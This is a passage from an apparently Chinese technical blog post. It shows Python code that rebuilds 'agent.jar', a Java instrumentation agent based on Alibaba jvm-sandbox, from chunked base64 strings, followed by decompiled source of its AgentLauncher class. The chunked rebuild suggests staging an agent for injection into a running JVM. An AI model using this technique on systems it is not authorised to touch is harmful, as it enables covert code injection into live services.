class="hljs-string">&quot;UEsDBAoAAAAAAAsdRlkAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkYvUEsDBAoAAAAIAAodRllB90L8xgAAAFMBAAAUAAAATUVUQS1JTkYvTUFOSUZFU1QuTUadj8FOwzAQRO+R8g/+gbVacUDKre0NEVSBxH0TT4ghXiN7E6V/j9sq4sKJ486M3uy0LH5AVnpHyj5KY/Z2V1eH1I9+QfqVzxPWOZvNqKtTAiscHS+NOXxzP8K0vEDq6jj7SW96uGTv7oKjJ/dV6I92Z/cPBC4lHxCl08Q5N6aPwfLkO+7Yfi7BZhbXxdXyNWRv0WeepdRcu1noFQ6DF9wBKAhNMzZPE0seYgp/2W9QemEtO6iFjtHRORXWumXKFdjLv16rqx9QSwMECgAAAAAACh1GWQAAAAAAAAAAAAAAAAQAAABjb20vUEsDBAoAAAAAAAodRlkAAAAAAAAAAAAAAAAMAAAAY29tL2FsaWJhYmEvUEsDBAoAAAAAAAodRlkAAAAAAAAAAAAAAAAQAAAAY29tL2FsaWJhYmEvanZtL1BLAwQKAAAAAAAKHUZZAAAAAAAAAAAAAAAAGAAAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L1BLAwQKAAAAAAAKHUZZAAAAAAAAAAAAAAAAHgAAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1BLAwQKAAAACAAKHUZZjfQUsW8FAADNCwAANgAAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1NhbmRib3hDbGFzc0xvYWRlci5jbGFzc5VWXVcTVxTdF0IGwigaCBRBSykgCWisrVYBrRWhYgNaoliktr0kAwxMZtKZCWq/1+qfaH9AV19xrVZau+xjH/pv+u5qu+9kEgKEpX3IzM255+x9Pu+dv/55+geAS/hWQ4OAvi43Zdo2/PSd+UycGxEdTYgKdBXkhjHp2Dnp3zX9Na48X9q+JzA0nAmMLGmvprO+a9qr48n9ohgEmnW0ICYQnTBt078skKhnuxCDjkMaDivtNlLX+jRpSc/LODJvuALx4aVM7SZtm3FUIJmVdn7ZeVijvGTLguEVZc64NOiNF6W/pt73NbQLHNnx4ebyupHzY0igU0OXjlfQvWu/7CMjWHHcgvQFLtaJYCmzF7BeQlrQg14Nx3WcwKsCZ3JOIS0tc1kuy/T6ZiHtlWNIy1XD9tP7I2I6fafiT7xewnvwmo5+vM6yrph2ft7wnJKbMwT6Dy5ZJZOqBoM6hpR166rhV4wV6rCOJFICh2pR2QkjB8OWfNNKT9mlguFK33TsAH9UxymFo9fge4ogreMM3hBoUwRBtPkgcIHBFzRboBaE/g==&quot;</span>,<br><span class="hljs-string">&quot;po63FEaLwgjESnpex9u4QEqXfNamEcJ2DO/DSC5oGBNo35FPPcwZReW88n1C58ywg1ssuhei1JuEe/u9a8UVvKvhqo5JXBM4GuybDncdz5DLFgvUlFNrgcZh5cb0Ljdur7nOg7LayTqE9QZKIDLp5GnQljFtY65UWDbc22WIeMbJSWtBuqb6Hwoj/prJeM5m/m9PjjMh1UET6Az1Jx3XuCHdadMybnHyBGLVXHoaPhA4Ue29WWmp0TLybMKqEj1SqMxHybUEDu9uVTZi1pe5jVlZrPhPNfrfdUDv0bHdUT8qViI/Wd9kYjfj5XENSzy96upquF+pF4s6c7MmipasuWpLv+SSafzlh2UfO88fGfbc0X3tJSAIn8jUaVzuaWHjU+seJ9uqHa6OvVgTKRWpyb7Zs6FhQ6Bvj3DO8aedkp2vCTj5UhOhaNQM1jkkSR2MwszKLcfzzKBGsWxwUqhuYo33N+FphcJT+6rj+J7vyuKs4a85ea8tCp4BPkoaNtWt9kBgYIfQtDedDSPkLV900zLnO+4jge9rwwgVy6DXyW4Z3kDGcTZKxTrDd5Ch6rk66i+4OkKISWlZWdM3xpvxSN1FzMSY4KE2Y9uGG2TCYIm+5HH5Um5r+LoyggeqkqasjD4eozq/DHh2qJuLqyh/LXgPDbjOlQ8NjXyfTkWeQSw2/s7H6FMl2oaW3UZrKn6k6Rnii40j2cXIaPZXdPyCY49p0YAZPg8H1h28ehO8Hjpxg//6yoh4HxkgWM2SWQSrOa4acFN9q1Byiz9eWnwqXz7jjrJMpEaeoG9WjP6IptGt1Mg2BmZHt7jRGFB2shuAYwykB63oxSEG1k7YHepElTqB+YA6ijZkcZsEdyhthniuvlk4VupOo42i/66W/mQt/UiZPlJDP0DIQdIPkX6Y9MkX0i/gLgk+pFSvShb3OHSvmpmP8HGQ40/IxKsrdPFvvhV7Url4eu7Un2g6taXWZ8civT+gJdUdeYJz3ZGtsUhqpHcb41uE0ulCHy6G7g+x+KoQUaQR48WtLt52nEMXzuM4LgSa/RgLwrlMrXYG+CkkrfvZKsvIcUUHqiEmwxDVKg+DLkdZ0BVaNAbBdlJSxlilZXlvlXsq7H40PoeuYe05jvD5L1UjGno0JAT/go+L1YSshwmxuD6BQtgy6aCGQFPqZxzbqnZlNBBeCYLQywqhwwI2roXGC3w38N2a+g3vCPyESOZxoBxljqbCbosH8c5TdofSLHO2UAPbGsKqaPhJPqPRjoZO4EmRHR3UFi5/D/E5/6kP6y/wFb5B939QSwMECgAAAAgACh1GWZNuBnUfFgAAyS8AADEAAABjb20vYWxpYmFiYS9qdm0vc2FuZA==&quot;</span>,<br><span class="hljs-string">&quot;Ym94L2FnZW50L0FnZW50TGF1bmNoZXIuY2xhc3OtWgl8VNXVP2cykzeZvJAwASQgEpA1q4KghEWSkJBANjMBDKDxkbwkA5OZdGYCpLZudana2iq2Fdxaa0sX2yK0Q4AK2r22drG2dret3fddbal8/3Pfm5mXZNj69Se+9+69557tnvVOnn396HEiWumaoJGLqbQ7MlBphILbjG1G5fadA5UxI9yzLbK70ugzw/HKank2GUPh7n4z6iM3eTTK1kkjL1PBdmOnURkywn2Vrdu2m91xpuwVwXAwvoopa8HCjTnko1yNdJ3yaAKTrsCDkcr6YMhkyouZg0bUiEeitf1GlIlr/WCrQKeJ5Ge6YMDYYdZGwt1GfFMw3o+vWNwIx2NM8xc0pekG4tFguG957cLxc34Ch8LCZJ2m0AVMOSmCTP5M8C4qEurTmJZlojF+KiPVLCrygfQMnS6imUwT+8x4wFJpbW9fmxHvZ5qXAX1GXG6aJRzNZroiw5ZzROKhAi/NZfKoE80Bb/N1WiAayW2q3tBS29DV3LqmTngu0amUynBS8Ui9acSHomazMch08enZHYoHQ5UAWi7bK3SqpEuYtKAcVijEFFgwBsyBSICiQwNiZI2pTyMejISTyMOmLEF9ke4dZry6pydqxmLLvbQIdmbE40Z3v1C9TKcltBRMQ9EtxoAZGzS6zTTTKdIZdCPbr9BpmWz3YntHZIcZlsnlOq2glTi8XdFg3KxWtNrN2FAIJl57TidxJgnEM5iu1Gm1HEJBe11gQ1NHV31jU11XW3VHgw82WyMuVss0OZPqNwpEnU71tBaaMHcHY+IX8LjNstCo0zq1EIyJo8lUk07NMuXtNsKbRCKNWpmmpTG3D4XjwQGzbne3OSgn4Kdsukosr51pts2C7biZ9dhCNRptgF85QRUpBI0O2iTiXI3lMbg2L9zopc04u7mx5cl/Ph9tpWs0ulanLrouyWZGTcKCcWoNkZg6eKZJCzIyt5W26dRNPbBMgLdFonGlrUYf9VKfRv06BWk7Dju9tTEcN/tMxAltpxEaMlt7maYsaHQityGAPUQDGoV1itDgqJBokcc59EaiA0Y8c1DZ4piyYmhm/XZQVKcYSYQ1BgfNMGQpcaKTEBow3zBkhrtTJwQlWyeg9u/UaZcEbU9vaCjWLzPDOr1RzXSHIjGYxJuYCtMYO/qjkV3GNjGg6+kGnW6kmxCzjZ6ewNDgoCjfBA9TnTykdsBCNboliQ1sNLamLEtM5VaxhpvEB27X6Q56K8zcTjq1ISMWa4oYPWZURZ78MT6cS3fR3Rq9Tae30z1gZ9QqrKE7ghCCwLLeHB7jO0nlbhYU79TpXroPRgBzGBONMxyCPQ==&quot;</span>,<br><span class="hljs-string">&quot;pdH9TJecOVsGxonhoz30bpH3PZkzVyb3Fhb36rSPHgSLg0PxMdHf5uecmPbSw0yLwXSFzXQFmK6wma7ojkTNipgZ3WlGK9qikd3DtZgIqLHw/ahO76X3IXGGIIqSiWnuWVKXAgPZ98N3ekyE9ciwRh/ASY4B8dHjtF+nD9GHgR/H0GzG+yOwqNVncRILv5Ni1OwNQdRKCwNIf9QKC42qYuiG/X6MPq7RJ3Q6QE/CZE+3UyJmeCcywBhPtTV5Fk+1p0Rth3T6pPhVvvKrxt62SCwWhFvIsSZ0OiyWlx01ByI7Tck1R3Q6KglossSmaGTQjMaDpgrdUiwIxKd1ekog8lNp2VKMrJ3Q6WlZm5AuMxoiA/DmzwBj2j22G9HKdUbUSghMn9Pp81KcTErvCgwOA8Ai+Qx9UUz2S4iJY4M/jPNZ+opGX9XpOfoa05xzSehIIlbU6ojURCJxrBmDDh8JmEa0G2XRNGfKdnCsMh7TN3T6pjA92VFRwV5TXDN9S6cX6NsoHsVgW6NrzN5g2HQQYlp53mWUYzts60XE3TN6k3CEYrU32Idj8tH36FGNvp88irEIvfRD2Go8ktrgpR+rxF0TDPdo9JNROQmaC5kGAuhL9DOdXpZ8rm+z5jZKkvLSL5jc27DTS7+y6pmmSLcR8tJvkL1sJoutuqm414BeeyokGv9Ojvr3Y/LJeNU4o7skvT/q9CdJqdkhM9wX7/fSX5BJrt0aK5kjq3/T6e/0D8QAZD50DrHTVDKb5dRe0elVgS0Ixloi8RoA7LDWNfoXzjJtEk3B8A6zp8GI9SPa++g18sj2/+j0umzPg9rSe+F/+E/SM7t0zmI3uIsNhoLxzGF44Zbxc17OBoqVcFv26pwjCteCsbqBwfgw6HKuzrpU5gVQNCzNQHFobURi4wk650tx52oNeHkiwviuYFh4KdR5Ek+WSszOVEzTT5/HN3sZONz9cGhBWqTzNEE6aU1dfbWUjIHqljU1rVd3NbQ2S/3OF+o8gy9i8qVZYlp7hhr8fBoJIVCs8yzRQ04wtgmGFtkV8/LFUhtdGVx47ZbKrVuvWbDFKH/jNQvVt4/n8jyN5+u8gBeOOskoaqfdlXBbVCeIDhpcalA1heVnaTVGbVwuBEp1LuPylKXBxxefrTByYGq2NgFTJV+i8aU6LxL5xrHanETu7hUH48vwNefSqkrZt1TnyyUu6VFzMITeoz4YjcW9vAxqCif7ES8vVwlRnYmX0Vp44tJsePlKJiSLauAbRPAXJdfqvEbwTU3HuXRekFDn5Xr43dzYStTLPm7gRo3XoTrk9UnGHdqrGQqGVOQ7g2bHg8P2m5k6l3f39gmR2HAsbg50DUR6hkKmTOBLvQ==&quot;</span>,<br><span class="hljs-string">&quot;7ajSJRYq4yEUEw4wSLQzCHTynVKF4hpiturcNiYHNaudIqKYe7vOATH3qUkz3xCoa5dedUOqUWLeoPNGwTJllLIUVZUVuIFqvNypun9V5wQHvbwFZ3FJhfpPcFyj87XcBU6sJFUfjQw429/W8ZpLqum/8ayNXjYQ9W12BtGNeLkbgeYSOUpT515perzxSDLHP879OgcZDUqhVSHEUWggqa6JDCCASH9mH2PM7B5CvT9cORYGRhLiAY3DOkcYAl10ZnCEUhCqxREHIkNR6aUvHEcivQrkUY5pHNd5iHcm66sMgFZVJinJKgkKFjja/A3tTUC0m4c1fqPO14sKdOei1brZ/Sy/Wecb+EaLzzYjijLDulJKoUyWKwJ8s863CL6cFLAfCW+Wj2/j2zW+Q+e38p2jGzdl7Tb2lONJs+OMH+kVOMvdQC+2XyGO4OO38z0av0Pndyr7zrTHUoY9HvaTl2ZpvAe9SBoYGQI6FH4ra1OfyeTH95HHy++GWiKxCnEtEeceyTB7dd4n4qKsaIrsMqO1Rgyamei46emqXlvX0gH5kpdqqnyQOzEnTEdHdW0DxAoE+8LKF5g2jDb3FRnM/Xzbo+WrEBcvqG2qDgS6Wuu7alvb6/BoqW9cu6G9DhVhaqWtvfXqTmsdUWBjXTsMpK65raOzK9DR3tiCmF2wvq5zVEaEhDLVUt1cF2irrsV4YjJxOuYUjIWyq7ENuTMJI4N8x2JbazuUpieXrWGOAHS0rq9rAabkkj2eKmvgu62uvaOxLpC+4EGsF7eQ9hb1acvQwDYz2iGllZyBlGwbjWhQxvakO94fhMWUn0W7o65ql0uISfcDMBQ07ZZ3Lz9zoXeme7mNkLLX2YKAOYGH4Z4bBmhMMWtx4ut1hNkpo0UfHkyKv+TsZjduRszK1bsL3jcqINj3IYi2wDs5teS4n8CaJySMIOqd6Q5PVQLC3YTREQcKCqDC3gFGbfZzu50NyKLzdxFVH6k+BxpLMRqTkBNO3bT6x9+gYFKRbu1Vvb3V10soGNtNp7SUnltRIhrkeEpLY3oAOO1peiQ4ok011dUASUS1xzLnaI9GX8PbHTTSXBJ4FNu8WW6qjCGJZv7BcX0y5BIl1Y82zuEF/5Xt/A9uqVGgxWwm8nqc3QEsZsfOgNkneKqjUWMYAmdoPjC7Y2ebEYzaoMnN/lGzCoHGP2JqPPsd/Tk7TtaA+GPWDrlE023m7Rwx8P9W6Pm0HDh15OGi01btabHPk5+MtHKSka0mRTNDycc0dK714P9SOYi83hXdIfvXNZ9VUllVj39U4K+QvXDC1EWLdbsVy8/mv/j4r/w3jf+u00T+x5i7G7n5sqlZP7vVG93xSBQm8MCCpg==&quot;</span>,<br><span class="hljs-string">&quot;cYAW0gbEnJAZm9MUiewYOkv5O2qjRPcM4Ge5Y7NR1CLgBRDHUXe9gpjAjC7Fy69BQcxW7+HlfyOfMCPKsh0Xy9XtzHYj6uX/IB6NXosNDltLpxAKOTldkY4yXhdD6czJhsbrymIqVj8OFccjxVH101CxJITiqmJO3q54XR4cRApfuc2cS1OzqXsj1QjC0xrDYZRrEjvNmObyMc09J7VrLj1Z0p8WFNHIAqZZhMxFRJNpmlwm4GuadFnq/SDezA/h20VzMH7YMb6UfPKbocDJz1bqfQe9FeuPyDo/Cvj3OuC/g/H7HOOHMH4sPeZVGL/fMZ6C8eOO8RUYf8AxrsL4g47x1Rjvd4w3Y/whx/g6jD/sGG/D+COO8QqMPzqGnycc49UY59tysvzcjZWPYVQp10p4e0oOU9aTCvTjeGaryWn8CTx1C4APsKz75Gdge/NlUISs+UoOUs5Ryic6MAbDDAcGHx9UDPikT86MoXA8hlmZMMjFqY3hcspSa3mC4SBNOkpTxyOZ60CSl0Ly+TMgmT4eycJMSORqI4XEZSMZoQsVkuLxSMozItl4OoVcPB7DpRkUksOH+JM2hvXA4MI73z/nEM0DLwtLR6h8U/psJ0BYoq3koWvwfa1CN8Xawp9S6OQrwYdBIodHUojvgKPJzun+S23EzWUjtBj/X14mJEaoSohkKSKzYWFE/SAShKa3Uy7tgH2EaBINgMR2WGFEES62UKYIT7cJ+xDSj8AfXXzUllbN8DEwWiI/ZltM8V5oRQPE/cfI13mQVh2m6pbyBK3ZSzPxathLPrzW76OJx6ils/wotREdpsCJY9TRWe4+TBur3EVuf6f2FLk7s0oCne7SQKenLEFbAp3ZeBkjZAZGaEeC3rCpyJ2gIXns3k9FVR77S6/KLvIUZSfozUWeE/spv8othIqA+i0nnoRsy6iXwnQ9DdIQ7ca7gm6FIm+2tbSO5G9EboB2boTt3wSt3AyN3KKgltFt1ER3UoDuos10Ow7rNjLo7cB3DzDeiv/eCUz3AOIdtIf2KG2ugjaW0Xr+NEMgrPj4OJ9Q8fF+XmZr+H5eKXFBfT3Nz0CfuXQnf4Y/C54+h9m15D1JxRr58k7RlfLnMSH1bytmNOog1uj6U5RD2WMWMK3WvK+Rq0ajm3NxTC/Qt3GAYjsftW1n9UG6reQI3emivVTM1uAdLvoAFaa+n6Y9zftp6jHa01lSepje1SwrZUfogSzaVHYgZWDTICohDE+kh6mIHqGF9H5aTI9DBfuVKkpAcR5gP89fULa9OqWA1fxFpYDFcEC1qsTOIdfCkzRJgya/hKEbANfD5b9MtbYIX7FFaHZy2sSlHyT3k6X+hxL0SHOZ/7Gspw==&quot;</span>,<br><span class="hljs-string">&quot;6PEEfbDM/xH7i/GGqTxhvzaVJuigheFTLlJe6VbyzAMHRAcpjw7BKD4JcxiBjEeolI5Cpqeoho7DHE44nKbZligPEj0LORjwi/kr/FWH01gzz9kyIuifpMLRIpbI37hYIrqegU7z4FST4dyLm/EYacHjWJUbz+NVntJj9Eyn+FmRZ4Q+C087TF84Ql92UZlMfH2EnoczZPu/k6DvVmlFmv8HHqigM8sfgl/hIcrwKEcrcmOmHBNPVHmx4SHZkFOUM05nVT5M/sieLPLZs0/TSwn66dLcybn7qAEAP7fIFGlC5tmAArXpeJVHi9r304wqHcCPjcW2qUg/gflfjqey9UCVR5zZ/+siz2H67QmY0UfoeZj09Sh3ssXW7aO7RQI97MNDX0WUeo4K6BsIqM+jNvkW1Ps8FPxdWkTfpyV4V9FLsKifwYtfRkT8JcXpN/Qm+i28+Xfw1z/CE/4KKn+nT9M/6Gv0T+z+Fyi+Qi/Sq/R7eo3+RKfoFfVbEHM2nWKN3ZzDHmUW9yCcv0hT+Wv8dZK/EfsLXwAD8YDmczCQb+Bwa+lz/E0YiAbaD/Hz/C2YRBzmIEaTA/o38AuY84GLbfRj/jblcg7p/B3g84hZqIhM6suK0h4uUEboQqTJ5RfxlQXdePi7+HIrIxRTtag+B6oWrefE1AUbojkpw2ygrFMQU9foLo2eTUYW69/3NHpcI7f1ZBVjik6JXGOA1YpdvX0PMrwKDVqJa6udU6dzCUqwkgT94REqKPH/OUF/3Ueaez+5s55IxRX5IzXiYsrmWciCs1EDFTsS7nT+vvicYtpDrqLVkpdeT1GqsaspKQH+OR63SuA8b1QJMApfruCTn+FsfJsB5Eri20taCfCVHhjDawlpXIqjKsNRlTiyuY1bff1AlYJCRRMqoi6f/G2c5fh8FRBJvr7xGL3WeZj+3QR6J/eSp/RAif9Ugrm57Pg+GZW1lB9f6s5a6pnsmex+jK4qn+xZJD6voLP3U1VRdiF7sEH8/7jnvbSwSMtahNV9NLNIcy9KwvlLZV5mrLh+q4f3n/q4ksxyqXrEdeJL0AItxilchtR/BQx7GerJKpqJBLYEBe5KvhKRr5rWcQ1t4FrqQi1mch3181raBZg38zqljcug2XUovH7IP4L0S6iGfwxtSPa40S47vIAX02bUjn38EuDSEVStwVAt7S0g7SRNhOWdpDyNf/I6efFkRNULoNKTNB+j12jCq3AMyxB/iuOcwRfZKeQunItE7lliiDNKjsB7aR9NKim100mobIR9OOKytCKsI26lCerHpauQNFscKWAW/8zySHy9bGf1Wfxz8ciUAAoq5Wk4/ply/DZ/vwB/s5DyLXObrewGZeVBzg==&quot;</span>,<br><span class="hljs-string">&quot;K+SCBPvFdtlhu5tgNk/TUlueR8GEsFFeUshTDvLUEZ7eNMIz99KMQp49wnNKE1zSXJbgir2UW1bIixO8pMlxyCqF81aY7jU44GvpQu6ii9HplHJ3SsYLcfy/5F8pxsrt+JNLs1VkY4eM5Y5ootJcaVrIX4PpJSmm19q1fi6YvqKQq8B02qMsKfsdHpprEXWQyrVJpZEvy4h8RSGvyoB84DyRH00hD9jI84F8taTkEa4ZRUBV9hyF9Q0BUdRBKH8cofyxhOQ3Q5vQfVChFI3zS8vsWm0mSNZZSbVMcmpZOQirypjXOooYi4EbgOxGmsc3pwoxoOLf8G+Vcc23XU2+Xla5Q77EZrMc7M13OF2WxEyLz99BIU+lFPICzFns7zpRRtMxbugs5KYCq5hHR3KhcDrCLSjpD9I8VPQo7rWDfFWg04vpjkBnQbYUOiLGYd7UXAYZry7kzSO8VT6vK+Rt8pngnrSGS0Cf+DZo+HaaxHciH9xNi/hequI9tIrvoDp+gNr4QdrCDzvc9DrbcD2YP6jctA47RSFON71uzIl4+fepNv1uhYdok5RffmTfvgRD929I8C7UYQl+U4JvOsRT4YPSePJbiA7xVSN8ayHfleC3qbl7MUerjvF9nYf5/kN0WyG/a4Tfk+AHDnHekyk3t/q2pbDVy2kyIejCuC+i5cgUjbSamhFsO6CKPygW/8h/wvsKNIl/xu5/quer6vkv9Typnq/LEwlYni71dKtntkso+fCV48p15VHR/wFQSwECFAMKAAAAAAALHUZZAAAAAAAAAAAAAAAACQAAAAAAAAAAABAA7UEAAAAATUVUQS1JTkYvUEsBAhQDCgAAAAgACh1GWUH3QvzGAAAAUwEAABQAAAAAAAAAAAAAAKSBJwAAAE1FVEEtSU5GL01BTklGRVNULk1GUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAAQAAAAAAAAAAAAQAP1BHwEAAGNvbS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAADAAAAAAAAAAAABAA/UFBAQAAY29tL2FsaWJhYmEvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAABAAAAAAAAAAAAAQAP1BawEAAGNvbS9hbGliYWJhL2p2bS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAAGAAAAAAAAAAAABAA/UGZAQAAY29tL2FsaWJhYmEvanZtL3NhbmRib3gvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAB4AAAAAAAAAAAAQAP1BzwEAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1BLAQIUAwoAAAAIAAodRg==&quot;</span>,<br><span class="hljs-string">&quot;WY30FLFvBQAAzQsAADYAAAAAAAAAAAAAALSBCwIAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1NhbmRib3hDbGFzc0xvYWRlci5jbGFzc1BLAQIUAwoAAAAIAAodRlmTbgZ1HxYAAMkvAAAxAAAAAAAAAAAAAAC0gc4HAABjb20vYWxpYmFiYS9qdm0vc2FuZGJveC9hZ2VudC9BZ2VudExhdW5jaGVyLmNsYXNzUEsFBgAAAAAJAAkAeAIAADweAAAAAFChFI3zS8vsWm0mSNZZSbVMcmpZOQirypjXOooYi4EbgOxGmsc3pwoxoOLf8G+Vcc23XU2+Xla5Q77EZrMc7M13OF2WxEyLz99BIU+lFPICzFns7zpRRtMxbugs5KYCq5hHR3KhcDrCLSjpD9I8VPQo7rWDfFWg04vpjkBnQbYUOiLGYd7UXAYZry7kzSO8VT6vK+Rt8pngnrSGS0Cf+DZo+HaaxHciH9xNi/hequI9tIrvoDp+gNr4QdrCDzvc9DrbcD2YP6jctA47RSFON71uzIl4+fepNv1uhYdok5RffmTfvgRD929I8C7UYQl+U4JvOsRT4YPSePJbiA7xVSN8ayHfleC3qbl7MUerjvF9nYf5/kN0WyG/a4Tfk+AHDnHekyk3t/q2pbDVy2kyIejCuC+i5cgUjbSamhFsO6CKPygW/8h/wvsKNIl/xu5/quer6vkv9Typnq/LEwlYni71dKtntkso+fCV48p15VHR/wFQSwECFAMKAAAAAAALHUZZAAAAAAAAAAAAAAAACQAAAAAAAAAAABAA7UEAAAAATUVUQS1JTkYvUEsBAhQDCgAAAAgACh1GWUH3QvzGAAAAUwEAABQAAAAAAAAAAAAAAKSBJwAAAE1FVEEtSU5GL01BTklGRVNULk1GUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAAQAAAAAAAAAAAAQAP1BHwEAAGNvbS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAADAAAAAAAAAAAABAA/UFBAQAAY29tL2FsaWJhYmEvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAABAAAAAAAAAAAAAQAP1BawEAAGNvbS9hbGliYWJhL2p2bS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAAGAAAAAAAAAAAABAA/UGZAQAAY29tL2FsaWJhYmEvanZtL3NhbmRib3gvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAB4AAAAAAAAAAAAQAP1BzwEAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1BLAQIUAwoAAAAIAAodRg==&quot;</span>]<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;agent.jar&quot;</span>, <span class="hljs-string">&quot;ab+&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        f.write(base64.b64decode(i))<br></code></pre></td></tr></table></figure><p>反编译后的源码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//  </span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA  </span><br><span class="hljs-comment">// (powered by FernFlower decompiler)  </span><br><span class="hljs-comment">//  </span><br><br><span class="hljs-keyword">package</span> com.alibaba.jvm.sandbox.agent;  <br><br><span class="hljs-keyword">import</span> java.io.File;  <br><span class="hljs-keyword">import</span> java.io.FileWriter;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;  <br><span class="hljs-keyword">import</span> java.net.InetSocketAddress;  <br><span class="hljs-keyword">import</span> java.util.LinkedHashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br><span class="hljs-keyword">import</span> java.util.concurrent.ConcurrentHashMap;  <br><span class="hljs-keyword">import</span> java.util.jar.JarFile;  <br><span class="hljs-keyword">import</span> java.util.regex.Matcher;  <br><span class="hljs-keyword">import</span> java.util.regex.Pattern;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentLauncher</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_SANDBOX_HOME</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(AgentLauncher.class.getProtectionDomain().getCodeSource().getLocation().getFile())).getParentFile().getParent();  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String SANDBOX_USER_MODULE_PATH;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LAUNCH_MODE_AGENT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;agent&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LAUNCH_MODE_ATTACH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;attach&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String LAUNCH_MODE;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String RESULT_FILE_PATH;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Map&lt;String, SandboxClassLoader&gt; sandboxClassLoaderMap;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CLASS_OF_CORE_CONFIGURE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.CoreConfigure&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CLASS_OF_PROXY_CORE_SERVER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.server.ProxyCoreServer&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EMPTY_STRING</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_SANDBOX_HOME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;home&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_NAMESPACE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;namespace&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESPACE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;default&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_SERVER_IP</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;server.ip&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_IP</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;0.0.0.0&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_SERVER_PORT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;server.port&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_PORT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;0&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_TOKEN</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;token&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_TOKEN</span> <span 